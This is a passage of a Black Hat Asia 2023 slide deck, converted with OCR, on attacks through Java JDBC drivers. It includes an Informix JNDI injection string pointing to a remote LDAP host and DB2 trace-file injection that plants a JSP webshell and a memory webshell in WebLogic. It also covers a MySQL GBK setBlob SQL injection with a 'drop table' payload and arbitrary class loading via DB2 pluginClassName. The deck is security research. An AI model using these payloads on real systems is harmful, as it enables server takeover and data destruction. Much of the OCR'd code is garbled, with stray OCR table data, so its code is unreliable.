---
title: "A new attack interface in Java"
speakers: ["Yuanzhen"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2023"
edition: "ASIA"
year: 2023
source_pdf: "Black Hat Asia 2023 slides/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf"
pages: 80
sha256: "b4399795a643547329953d519df98715a926199d773d339ecb015bb8323a1903"
text_chars: 54272
ocr_pages: 44
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.1
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T01:41:41Z"
---
# A new attack interface in Java

**Speakers:** Yuanzhen  
**Conference:** Black Hat ASIA 2023  
**Source:** `Black Hat Asia 2023 slides/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf` (80 pages)


## Slide 1

# A New Attack Interface In Java Applications

Xu Yuanzhen

#### Peter Mularien

#BHASIA   @BlackHatEvents

> Text below was recovered by OCR (confidence 93/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
ASIA &
MAY 11-12
BRIEFINGS
A New Attack Interface In Java Applications
Xu Yuanzhen
Peter Mularien
#BHASIA @BlackHatEvents
```

## Slide 2

Abused Connection Resource Arbitrary Log File Writing

Lexical Syntax Compatibility

Unchecked Initialization Class

Incorrect Response Disposal

JDBC Attack Protection

## Slide 3

Abused Connection Resource Arbitrary Log File Writing Lexical Syntax Compatibility Unchecked Initialization Class

Incorrect Response Disposal

JDBC Attack Protection

## Slide 4

## Leverage JNDI  to Connect JDBC Data Source

JNDI Tree Connection Pool
Data Source Connection
JDBC Driver
Client Data Source Connection Database
Connection
Data Source

## Slide 5

## IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

SQLH_TYPE=LDAP LDAP_URL=ldap://host-name:port-number LDAP_IFXBASE=Informix-base-DN LDAP_USER=user LDAP_PASSWD=password

JNDI Injection

## Slide 6

## IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

**JNDI Injection Remote Code  Execution Is NOT Trigged**

> Text below was recovered by OCR (confidence 86/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
DriverManager.registerDriver (new com.informix.jdbc.IfxDriver
DriverManager.getConnection("jdbc:informix-sqli:informixserver=ser ;user=user ; password=password ; SQLH_TYPE=LDAP
; LDAP_URL=ldap://remote.i1p:389/;LDAP_IFXBASE=Evi LObject"
G JNDI Injection Remote Code Execution Is Trigged
```

## Slide 7

IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

> Text below was recovered by OCR (confidence 82/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
try t{
SearchControls constraints = new SearchControls() ;
constraints.setSearchScope (LDAP_SCOPEO) ;
+ sname + , + this. ldap_sqhDn;
NamingEnumeration<SearchResult> results = this.sqhctx.search(lbase,
LDAP_FILTER, constraints) ;
if (results != null && results.hasMore()) 4{
SearchrResult si = (SearchResult) results.next() ;
Attributes attrs = si.getAttributes() ;
10 NamingEnumeration<? extends Attribute> ae = attrs.getAlLl();
```

## Slide 8

14 15

## IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

> Text below was recovered by OCR (confidence 86/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
10
12
13
14
15
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
public NamingEnumeration<SearchResult> search(Name varl, String var2, SearchControls var3)
NamingException
PartialCompositeDirContext var4 this;
Hashtable var5 = this.p_getEnvironment() ;
Continuation var6 = new Continuation(varl, vars);
Name var8& = varl;
NamingEnumeration var/;
try 4
for(var? = var4.p_search(var8, var2, var3, var6); var6.isContinue(); var7 =
var4.p_search(var8, var2, var3, varé)) {
var8 = var6.getRemainingName () ;
getPCDirContext(var6) ;
thre
OWS
```

## Slide 9

IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

> Text below was recovered by OCR (confidence 87/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
1 protected NamingEnumeration<SearchResult> p_search(Name varl, String var2,
2 SearchControls var3, Continuation var4) throws NamingException {
3 @ HeadTail var5 = this.p_resolveIntermediate(varl, var4);
4 NamingEnumeration var6é = null;
5 switch (var5S.getStatus()) {
6 case 2:
7 var6 = this.c_search(var5.getHead(), var2, var3, var4);
8 break;
9 case 3:
10 var6 = this.c_search_nns(var5.getHead(), var2, var3, var4) ;
11 }
```

## Slide 10

IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

> Text below was recovered by OCR (confidence 85/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
1 HeadTail p_resolveIntermediate(Name varl, Continuation var2) rows NamingException {
2 > var3 1;
3 var2.setSuccess();
4 HeadTail var4 11S.p_parseComponent(varl, var2);
5 Name var5 var4.getTail();
6 Name var6 var4.getHead () ;
7 if (var5 ! ULL && !var5.isEmpty()) {
8 eo) Object var7;
9 if (!var5.get(0).equals("")) {
13 var2.setContinue(var/, var6, iS, var5);
14 } else if (var2.isContinue()) {
16 var2.appendRemainingName(var5) ;
17
18
```

## Slide 11

IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

> Text below was recovered by OCR (confidence 87/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
1 protected Object c_resolveIntermediate_nns(Name varl, Continuation var2) throws NamingException {
2 tr)
3 ) Final Object var3 = this.c_lookup(varl, var2);
4 if (var3 != null && this.getClass().isInstance(var3) )
5 var2.setContinueNNS(var3, varl, this);
6 eturn null;
7 t else if (var3 != null && !(var3 instanceof Context)) {
8 RefAddr var4 new RefAddr ("nns")
9 private static final long serialVersionUID = -8831204798861786362L;
10
ll public Object getContent() {
12 return var3;
13 f
15 Reference var5 = new Reference("java. lang.Object", varA4) ;
16 CompositeName var6 (CompositeName) varl.clone() ;
17 var6.add("") ;
18 var2.setContinue(var5, var6, this);
19 eturn null;
```

## Slide 12

## IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

- Trigger a JNDI lookup

search
p_search
p_resolveIntermediate
c_lookup
javax.naming.InitialContext#lookup(java.lang.String)
Stack Trace
com.sun.jndi.url.ldap.ldapURLContext#lookup(java.lang.String)
com.sun.jndi.toolkit.url.GenericURLContext#lookup(java.lang.String)
com.sun.jndi.toolkit.ctx.PartialCompositeContext#lookup(javax.naming.Name)
com.sun.jndi.toolkit.ctx.ComponentContext#p_lookup
com.sun.jndi.ldap.LdapCtx#c_lookup

## Slide 13

Abused Connection Resource

### Arbitrary Log File Writing

Lexical Syntax Compatibility Unchecked Initialization Class Incorrect Response Disposal

JDBC Attack Protection

## Slide 14

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

- traceFile

   - With the property, the user can specify the name of a file into which the IBM Data Server Driver for JDBC and SQLJ write trace information.

- traceLevel

- traceFileAppend

## Slide 15

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

• Backdoor Webshell in Weblogic Server

JSP Tag

> Text below was recovered by OCR (confidence 82/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Logger Injection
* Backdoor Webshell in Weblogic Server
JSP Tag
=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp;
© Could not establish a connection because of java.lang.IIlegalArgumentException: URLDecoder: Illegal hex characters in escape (%) pattern - For input string: Ru<br/>weblogic.jdbc.common. internal. DataSourceUtil.testConnection0(DataSourceUtil.java:426)
<br/>weblogic.jdbc.common.internal. DataSourceUtil.access$000(DataSourceUtil.java:24)<br/>weblogic.jdbc.common. internal. DataSourceUtil$1.run(DataSourceUtil.java:288)<br/>java.security.AccessController.doPrivileged(Native Method)
<br/>com.bea.console.actions.jdbc.datasources.createjdbcdatasource.CreateJDBCDataSource.testConnectionConfiguration(CreateJDBCDataSource.java:511)<br/>sun.reflect.GeneratedMethodAccessor1084.invoke(Unknown Source)
<br/>sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)<br/>java.lang.reflect.Method.invoke(Method.java:498)<br/>org.apache. beehive.netui.pageflow.FlowController.invokeActionMethod(FlowController.java:870)
<br/>org.apache. beehive.netui.pageflow.FlowController.getActionMethodForward(FlowController.java:809)<br/>org.apache.beehive.netui.pageflow.FlowController.internalExecute(FlowController.java:478)
<br/>org.apache. beehive.netui.pageflow.PageFlowController.internalExecute(PageFlowController.java:306)<br/>org.apache.beehive.netui.pageflow.FlowController.execute(FlowController.java:336)
<br/>org.apache. beehive.netui.pageflow.internal.FlowControllerAction.execute(FlowControllerAction.java:52)<br/>org.apache.struts.action.RequestProcessor.processActionPerform(RequestProcessor.java:431)
<br/>org.apache. beehive.netui.pageflow.PageFlowRequestProcessor.access$201(PageFlowRequestProcessor.java:97)<br/>org.apache. beehive.netui.pageflow.PageFlowRequestProcessor$ActionRunner.execute(PageFlowRequestProcessor.java:2044)
```

## Slide 16

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

• Backdoor Webshell in Weblogic Server

- Servlet version 2.3 or earlier than 2.3 then EL expression are disabled by default

- Weblogic Server 14c supports the Servlet 4.0

- Use EL expression to evade the URL decoder exception

**<%.getRuntime().exec("open -a calculator")}; %>Runtime ${Runtime.getRuntime().exec("open -a calculator")}**

## Slide 17

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

###### • Backdoor Webshell in Weblogic Server

> Text below was recovered by OCR (confidence 78/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Logger Injection
Backdoor Webshell in Weblogic Server
DriverManager.registerDriver (new com.ibm.db2.jcc.DB2Driver ()) ;
DriverManager.getConnection("jdbc:db2://127.0.0.1:5001/test: password=${pageContext.setAttribute("classLoader"
r")) ;pageContext.setAttribute("managementService",
eContext.getAttribute("httpDataTransferHandler") .getDeclaredField("KERNE_ID") ) ;pageContext. getAttribute ("KERN
E_ID").setAccessible(true) ;pageContext.setAttribute("getPropertyService",managementService. getMethod("getProp
ertyService", pageContext. getAttribute("authenticatedSubject"))) ;pageContext.getAttribute("getPropertyService"
).setAccessible(true) ;pageContext.setAttribute("prop", pageContext.getAttribute("getPropertyService") .invoke(n
ttribute("getTimestamp2",propertyService.getMethod("getTimestamp2") ) ;pageContext. getAttribute("getTimestamp2"
).setAccessible(true) ;pageContext.setAttribute("username",
pageContext.getAttribute("getTimestamp1") .invoke(pageContext.getAttribute("prop"))) ;pageContext.setAttri bute (
evel=-1;traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp;
```

## Slide 18

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

###### • Backdoor Webshell in Weblogic Server

> Text below was recovered by OCR (confidence 80/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Logger Injection
¢ Backdoor Webshell in Weblogic Server
Cc i) 127.0.0.1
user.dir=/Users/pyn3rd/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain, line.separator=\n, java.vm.name=Java HotSpot(TM) 64-Bit Server VM,
javax.management.builder.initial=weblogic.management.jmx.mbeanserver.WLSMBeanServerBuilder, file.encoding=UTF-8, org.omg.CORBA.ORBClass=weblogic.corba.orb.ORB, java.specification.version=1 .8, launch.use.env.classpath=true } [ibm][db2]
[jcc] Dumping all file properties: { } [ibm][db2][jec] END TRACE_DRIVER_CONFIGURATION [ibm][db2][jec] BEGIN TRACE_CONNECTS [ibm][db2][jcc] Attempting connection to 127.0.0.1:5001/test [ibm][db2][jcc] Using properties: {
url=jdbc:db2://127.0.0.1:5001/test:password=weblogic/pynerd@ 123 ;traceFileAppend=true;traceLevel=- | ;traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp;,
pageContext.setAttribute("httpDataTransferHandler" pageContext.getAttribute("classLoader").loadClass("weblogic.deploy.service datatransferhandlers.HttpDataTransferHandler"));pageContext.setAttribute("managementService",
pageContext.getAttribute("classLoader").loadClass("weblogic.management.provider.ManagementService" ));pageContext.setAttribute("authenticatedSubject" pageContext.getAttribute("classLoader").loadClass("weblogic.security.acl.internal.AuthenticatedSu
username=db2 } [ibm][db2][jcc] END TRACE_CONNECTS [ibm][db2][jcc] BEGIN TRACE_DIAGNOSTICS [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 5bdb 1036]
java.sql.SQLException [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@5bdb 1036] SQL state = null [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue:
‘weblogic.kernel.Default (self-tuning)'][SQLException @ Sbdb 1036] Error code = -99999 [ibm][db2][jcc][Thread:[ ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 5bdb 1036] Message = [ibm][db2][jcc]
[10333][11649] No license was found. An appropriate license file db2jcc_license_*.jar must be provided in the CLASSPATH setting. [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)']
[SQLException @5bdb1036] Stack trace follows com.ibm.db2.jcc.c.SqlException: [ibm][db2][jcc][10333][ 11649] No license was found. An appropriate license file db2jcc_license_*.jar must be provided in the CLASSPATH setting. at
com.ibm.db2.jcc.c.o.d(0.java:534) at com.ibm.db2.jcc.c.p.a(p.java:332) at com.ibm.db2.jcc.c.p.(p.java:404) at com.ibm.db2.jcc.b.b.(b.java:256) at com.ibm.db2.jcc. DB2Driver.connect(DB2Driver.java: 163) at
weblogic.jdbc.common.internal.DataSourceUtil.testConnection0(DataSourceUtil .java:373) at weblogic.jdbc.common.internal.DataSourceUtil .access$000(DataSourceUtil .java:24) at
weblogic.jdbc.common. internal .DataSourceUtil$1 .run(DataSourceUtil.java:287) at java.security. AccessController.doPrivileged(Native Method) at weblogic.jdbc.common.internal.DataSourceUtil testConnection(DataSourceUtil java:284) at
sun.reflect.GeneratedMethodAccessor803 .invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpI.java:43) at java.lang.reflect. Method .invoke(Method.java:497) at
org.apache.bechive .netui.pageflow.FlowController.invokeActionMethod(FlowController.java:870) at org.apache.beehive.netui.pageflow.FlowController.getActionMethodForward(FlowController.java:809) at
org.apache.bechive .netui.pageflow.FlowController.internalExecute(FlowController.java:478) at org.apache.beehive.netui.pageflow.PageFlowController.internalExecute(PageFlowController.java:306) at
org.apache.bechive .netui.pageflow.FlowController.execute(FlowController.java:336) at org.apache.beehive.netui.pageflow.internal FlowControllerAction.execute(FlowControllerAction.java:52) at
org.apache.struts.action.RequestProcessor.processActionPerform(RequestProcessor.java:431) at org.apache.beehive.netui.pageflow.PageFlowRequestProcessor.access$20 | (PageFlowRequestProcessor.java:97) at
org.apache.beehive .netui.pageflow.PageFlowRequestProcessor$ActionRunner.execute(PageFlowRequestProcessor.java:2044) at
org.apache.beehive .netui.pageflow.interceptor.action internal ActionInterceptors$WrapActionInterceptorChain.continueChain(ActionInterceptors.java:64) at
org.apache.bechive .netui.pageflow.interceptor.action.ActionInterceptor.wrapAction(ActionInterceptor.java: 184) at
org.apache.beehive .netui.pageflow.interceptor.action internal .ActionInterceptors$WrapActionInterceptorChain.invoke(ActionInterceptors.java:50) at
org.apache.bechive .netui.pageflow.interceptor.action internal .ActionInterceptors.wrapAction(ActionInterceptors.java:87) at org.apache.beehive.netui.pageflow.PageFlowRequestProcessor.processActionPerform(PageFlowRequestProcessor.java:2116) at
com.bea.console.internal.ConsolePageFlowRequestProcessor.processActionPerform(ConsolePageFlowRequestProcessor.java:275) at org.apache.struts.action.RequestProcessor.process(RequestProcessor.java:237) at
org.apache.bechive .netui.pageflow.PageFlowRequestProcessor.processInternal(PageFlowRequestProcessor.java:556) at org .apache.bechive.netui.pageflow.PageFlowRequestProcessor.process(PageFlowRequestProcessor.java:853) at
org.apache.bechive .netui.pageflow.AutoRegisterActionServlet.process(AutoRegisterActionServlet.java:631) at org.apache.bechive.netui.pageflow.PageFlowActionServlet.process(PageFlowActionServlet.java: 158) at
com.bea.console.internal.ConsoleActionServlet.process(ConsoleActionServlet.java:266) at org.apache.struts.action.ActionServlet.doGet(ActionServlet.java:416) at com.bea.console.internal.ConsoleActionServlet.doGet(ConsoleActionServlet.java:135) at
```

## Slide 19

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

#### How to Inject an Indiscoverable Memory Webshell into Weblogic Server?

## Slide 20

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

###### **Acquire Weblogic Server request object with current thread**

**Utilize malicious class to implement new filter register**

**inject  bytecode of malicious class with BCEL**

## Slide 21

**BCEL Code Transformer**

###### **WeblogicMemFilter**

> Text below was recovered by OCR (confidence 80/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
ylLic cla BCELTransfer {
blic static void main(String[] args) throws Exception{
String code = Utility.encode(cls.getBytes(), true); [_BCEL Code Transformer )
Class<?> aClass = new ClassLoader ().loadClass("S$$BCEL$$"+code) ;
aClass.newInstance() ;
; WeblogicMemFilter {
atic {
String filterName = dynamicFilter1;
String urlPattern nx":
String FILTER_CLASS_STRING = <STRINGS>;
Thread thread = Thread.currentThread() ;
Field workEntry
thread. getContextClassLoader () . loadClass("weblogic.work.ExecuteThread") .getDeclaredField("
workEntry.setAccessible(true) ;
Object workentry = workEntry.get(thread) ;
workEntry") ;
Field connectionHandler = Berens gasolelsel0 ). getDeclaredField("connectionHandler") ;
connectionHandler.setAccessible(true) ;
requestl.setAccessible(true) ;
Object servletRequest requestl.get(http) ;
Field context serv lLetRequest. getClass() .getDeclaredField("context")
context.setAccessible(true) ;
contextField.setAccessible(true) ;
Object filterManager = contextrield. get (webAppServletcontext)
```

## Slide 22

> Text below was recovered by OCR (confidence 70/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Se6se3sff$DSccp$f1i$T$L$iSA$sA') .newInstance() }; traceFi leAppend=false; traceLevel=-1;traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/memshell. jsp;
```

## Slide 23

> Text below was recovered by OCR (confidence 81/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
java.io.tmpdir=/var/folders/y2/p6q9zkfn52571162r_nceqShh0000gn/T/, java.vendor.url.bug=http://bugreport.sun.com/bugreport/, os.arch=x86_ 64, java.awt.graphicsenv=sun.awt.CGraphicsEnvironment,
user.dir=/Users/pyn3rd/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain, line.separator=\n, java.vm.name=Java HotSpot(TM) 64-Bit Server VM,
javax.management.builder.initial=weblogic. management.jmx .mbeanserver.WLSMBeanServerBuilder, file.encoding=UTF-8, org.omg-CORBA.ORBClass=weblogic.corba.orb.ORB, java.specification.version=1.8, launch.use.env.classpath=true } [ibm][db2]
[jcc] Dumping all file properties: { } [ibm][db2][jcc] END TRACE_DRIVER_CONFIGURATION [ibm][db2][jcc] BEGIN TRACE_CONNECTS [ibm][db2][jcc] Attempting connection to 127.0.0.1:5001/test [ibm][db2][jcc] Using properties: {
traceLevel=-1, traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/mshell.jsp, user=weblogic,
traceFileAppe >, username=weblogic } [ibm][db2][jec] END TRACE_CONNECTS [ibm] [db ¢] BEGIN TRACE_DIAGNOSTICS [ibm][db2][jcc][Thread:[ACTIVE] ExccuteThread for queue: 'weblogic.kerncl.Default (self-tuning)']
[SQLException @ 1432618] java.sql. SQLException [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '7' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 1432618] SQL state = null [ibm][db2]{jcc][Thread:[ACTIVE] ExecuteThread:
for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 1432618] Error co 99999 |ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '7' f ue: ri¢ = [ibm]
[db2][jcc][10333][ 11649] No license was found. An appropriate license file db2jcc_license_ must be provided in the CLASSPATH setting. [ibm][|db2]|jcc][Threa uy 4 :'7' for queue: 'weblogic.kernel.Default (self-tuning)']
[SQLException @ 1f432618] Stack trace follov m.ibm.db2.jec.c.SqlException: [ibm][db2][jcc][10333][11649] No license was found. An ap te license file db2jec_li jided in the CLASSPATH setting. at
com.ibm.db2.jcc.c.o.d(o.java:534) at com.ibm.db2.jcc.c.p.a(p, 332) at com.ibm.db2.jcc.c.p.(p.java:404) at com.ibm.db2.,jcc.b.b.(b jav at com.ibm.db2.jcc.DB2Driv
weblogic .jdbc.common internal.DataSourceUtil$ 1 .run(DataSourceUtil java:287) at java.security. AccessController.doPrivileged(Native Method) at weblogic .jdbc.common internal.DataSourceUtil.testConnection(DataSourceUtil java:284) at
com.bea.console.utils jdbc JDBCUtils.testConnection(IDBCUtils java: 1011) at com.bea.console.actions jdbc datasources.createjdbcdatasource.CreateJ DBCDataS ource.testConnectionConfiguration(CreateJDBCDataSource java:524) at
sun reflect. NativeMethodAccessorlmpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorlmpl.invoke(NativeMethodAccessorImpl.java:62) at sun reflect DelegatingMethodAccessorlmpl.invoke(DelegatingMethodAccessorlmpl java:43) at
java.lang reflect.Method invoke(Method.java:497) at org.apache.beehive netui pageflow.FlowController.invokeActionMethod(FlowController.java:870) at
org.apache beehive netui pageflow.FlowController.getActionMethodForward(FlowController.java:809) at org .apache.beehive netui pageflow.FlowController.internalExecute(FlowController.java:478) at
.apache. beehive netui pageflow.PageFlowController.internalExecute(PageFlowController,java:306) at org.apache.beehive.netui.pageflow.FlowController.execute(FlowController.java:336) at
total 40
drwxr-x--- 3 pyn3rd staff 96 Jun 20 11:25 autodeploy
drwxr-x--- 21 pyn3rd staff 672 Jun 20 11:25 bin
drwxr-x--- 3 pyn3rd staff 96 Jun 20 11:25 common
drwxr-x--- 10 pyn3rd staff 320 Sep 14 13:33 config
drwxr-x--- 3 pyn3rd_ staff 96 Jun 20 11:25 console-ext
-IW------- 1 pyn3rd staff 136 Sep 14 13:31 derby.log
-rw-r----- 1 pyn3rd_ staff 92 Sep 14 13:31 derbyShutdown. log
-rw-r----- 1 pyn3rd staff 263 Sep 14 13:31 edit.lok
-rw-r----- 1 pyn3rd staff 327 Apr 26 2019 fileRealm.properties
drwxr-x--- 14 pyn3rd staff 448 Jun 20 11:25 init-info
drwxr-x--- 7 pyn3rd staff 224 Sep 13 22:39 lib
drwxr-x--- 4 pyn3rd staff 128 Jun 20 11:25 nodemanager
drwxr-x--- 3 pyn3rd staff 96 Jun 20 11:28 orchestration
drwxr-x--- 3 pyn3rd staff 96 Sep 14 13:36 original
drwxr-x--- 2 pyn3rd staff 64 Apr 26 2019 resources
drwxr-x--- 7 pyn3rd staff 224 Jun 20 11:28 security
drwxr-x--- 3 pyn3rd staff 96 Jun 20 11:25 servers
```

## Slide 24

Abused Connection Resource Arbitrary Log File Writing

Lexical Syntax Compatibility Unchecked Initialization Class Incorrect Response Disposal

JDBC Attack Protection

## Slide 25

## MySQL JDBC Driver SQL Injection via setBlob Method

- A BLOB is a binary large object that can hold a variable amount of data

- BLOB values are treated as binary strings (byte strings)

- MySQL JDBC driver uses PreparedStatement.setBlob()

## Slide 26

## MySQL JDBC Driver SQL Injection via setBlob Method

• PreparedStatement.setBlob()

> Text below was recovered by OCR (confidence 89/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
10
11
12
13
14
15
MySQL JDBC Driver SQL Injection via setBlob Method
@Override
public void setBlob(int parameterIndex, InputStream inputStream) throws SQLException {
synchronized (checkClosed().getConnectionMutex()) {
((PreparedQuery<?>)
}
@Override
public void setBlob(int parameterIndex, InputStream inputStream, long Length) throws SQLException
synchronized (checkClosed().getConnectionMutex()) {
((PreparedQuery<?>)
this.query) .getQueryBindings() .setBlob(getCoreParameterIndex(parameterIndex) , inputStream,
length) ;
at
```

## Slide 27

## MySQL JDBC Driver SQL Injection via setBlob Method

•

> Text below was recovered by OCR (confidence 90/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
MySQL JDBC Driver SQL Injection via setBlob Method
characterEncoding = gbk
ASCII Oct Hex
39 Ox27
\ 92 Ohaste
```

## Slide 28

## MySQL JDBC Driver SQL Injection via setBlob Method

- PreparedStatement.setBlob()

o append a couple of single quotes( ) surrounding blob data o escape the single quotes  in blob data with backslash (\) 轡 )   ;   d  r   o   p  t  a  b  l  e  t 1  ;  # de 27 29 3b 64 72 6f 70 20 74 61 62 6c 65 20 74 31 3b 23 27 轡 )  ;  d  r  o  p  t  a  b  l  e  t 1  ;  #   \ 27 de 5 c 27 29 3b 64 72 6f 70 20 74 61 62 6c 65 20 74 31 3b 23 5c 27 27

＂ INSERT INTO t1 ( size,data ) VALUES (20,_ binary       \  ); drop table t1;#\ 轡 ＂

## Slide 29

## MySQL JDBC Driver SQL Injection via setBlob Method

Dabase Server
Master MySQL Slave MySQL
Payload

1

> Text below was recovered by OCR (confidence 88/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
MySQL JDBC Driver SQL Injection via setBlob Method
f Dabase Server |
Payload Master MySQL Slave MySQL
Connection conn =
DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/test?user=root&password=pynerd123&useUnicode=true&ch
aracterEncoding=gbk&al LowMultiQueries=true") ;
PreparedStatement ps = conn.prepareStatement ("INSERT INTO tl (size, data) VALUES(?,?)");
File file = new File("/Users/pyn3rd/exp.jpg") ;
FileInputStream fis = new FileInputStream(fi le) ;
ps.setBlob(2, fis);
ps.execute() ;
fis.close();
```

## Slide 30

MySQL JDBC Driver SQL Injection via setBlob Method

> Text below was recovered by OCR (confidence 89/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
import java.io.x;
import java.sql.*;
MySQL JDBC Driver SQL Injection via setBlob Method
> public class MySQLJdbcDemo {
public static void main(String[] args) throws ClassNotFoundException, SQLException, IOException {
Connection conn = DriverManager .getConnection( url: jdbc:mysql://127.0.0.1:3306/test
5	1	6	1	1	8	1444	697	1739	27	55.767853	?>user=root&password=pynerd123&useUnicode=true&characterEncoding=gbk&al
5	1	6	1	1	9	2812	693	345	36	86.951813	LowMuLtiQueries=true) ;
PreparedStatement ps = conn.prepareStatement( sql: INSERT
5	1	6	1	2	7	1199	744	60	18	93.213387	INTO
5	1	6	1	2	8	1279	743	33	20	86.506393	t1
5	1	6	1	2	9	1334	741	89	27	95.698524	(size,
5	1	6	1	2	10	1450	741	76	29	95.384354	data)
5	1	6	1	2	11	1548	744	100	26	93.139877	VALUES
5	1	6	1	2	12	1665	741	127	29	83.412453	(?,?));
File file =
FileInputStream fis = new FileInputStream(file) ;
ps.setInt( parameterindex: 1, (int) file.length());
ps.setBlob( parameterindex: 2, fis);
ps.execute();
fis.close();
| MySQLJdbcDemo
new File( pathname: /Users/pyn3rd/Downloads/jdbc-test/exp.jpg) ;
/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/bin/java
Exception in thread
at
at
at
at
at
com.
com
com
com
com
-mysql.
cj.
cj.
main
jdbc.
jdbc.
jdbc.
jdbc.
java.sql.SQLSyntaxErrorException Create breakpoint : Table 'test.t1' doesn't exist
exceptions.SQLError.createSQLException(SQLError.java:120)
exceptions.SQLExceptionsNapping. transLateException(SQLExceptionsMapping. java:122)
ClientPreparedStatement.execute(ClientPreparedStatement.java:370)
```

## Slide 31

Abused Connection Resource

Arbitrary Log File Writing

Lexical Syntax Compatibility

Unchecked Initialization Class

Incorrect Response Disposal

JDBC Attack Protection

## Slide 32

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

- pluginClassName

**Getter and Setter**

> Text below was recovered by OCR (confidence 88/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
1 public synchronized void setPluginClassName (String paramString)
2 this.pluginClassName = paramString;
3
4
5 public String getPluginClassName() {|
6 return this.pluginClassName; | Getter and Setter |
8
9 public static String getPluginClassName(Properties paramProperties)
10 O return paramProperties.getProperty ("pluginClassName") ;
12
```

## Slide 33

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

• No Argument Constructor

> Text below was recovered by OCR (confidence 90/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
* No Argument Constructor
import javax.naming.NamingException;
public class EvilObject {
public EvilObject () throws NamingException, IOException {
J
```

## Slide 34

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

- No Argument Constructor

**Thoughts Class**

## Slide 35

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

> Text below was recovered by OCR (confidence 87/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
import java.sql.DriverMaonager ;
15 usages
> public class DB2JCCDemo {
b public static void main(String[] args) throws Exception { eee
DriverManager.getConnection( url: jdbc:db2://127.0.0.1:5001/testdb:pluginClassName=com.example.EvilObject;); Fi 8 fe)
o
Run: DB2JCCDemo
at com.ibm.db2.jcc.DB2Driver.connect( Driver.java:117)
it at com.example.jdbc.attack.db2.DB2JCCDemo.main(DB2JCCDemo. java:13)
